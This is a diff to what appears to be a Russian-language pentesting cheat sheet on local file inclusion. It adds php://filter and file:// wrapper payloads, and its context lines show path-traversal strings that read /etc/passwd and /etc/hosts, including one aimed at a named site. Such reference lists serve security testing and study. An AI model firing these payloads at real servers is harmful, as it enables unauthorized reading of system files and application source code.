@@ -402,6 +402,11 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 ../../../../../../../../../../../etc/passwd%00 ;(etc/rc, etc/rc.local, etc/ssh/ssh_config)
 ../../../../../../../../../../../etc/hosts ;(proc/cpuinfo, proc/meminfo)
 
+**php wrappers:**
+index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+page=php://filter/convert.base64-encode/resource=index.php
+page=file:///hidden_code.txt
+
 Лучший способ проверить отдает он /etc/passwd или нет - это выполнить этот запрос и поискать в HTML-коде ответа имя существующего пользователя, например root
 
 Ниже приведён пример записи /etc/passwd:
